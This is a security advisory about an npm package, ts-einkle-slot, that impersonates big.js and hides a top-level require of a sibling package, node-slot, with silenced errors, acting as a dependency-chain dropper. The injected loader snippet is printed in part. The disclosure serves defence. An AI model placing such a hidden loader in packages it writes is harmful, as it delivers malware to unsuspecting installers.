summary: ts-einkle-slot impersonates big.js and loads sibling package node-slot on require
details: The package republishes the big.js source (v7.0.1) under the unrelated name ts-einkle-slot while retaining big.js's original author, repository, and keywords metadata to masquerade as that library. Inside big.js / big.mjs the package injects a top-level `try { const doc = require('node-slot'); doc.from_str().then(...).catch(()=>{}) } catch(e){}` block that the genuine big.js does not contain. The require executes on every `require('ts-einkle-slot')` load and silently swallows all errors via empty catch handlers, so consumers see no diagnostic trace. The package also declares a runtime dependency on ts-einkle. The coordinated naming (ts-einkle / ts-einkle-slot / node-slot), the borrowed author identity, the silenced error paths, and the smuggled cross-package execution are the structural fingerprint of a dependency-chain dropper that delivers code to the installer through a sibling package on first import.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
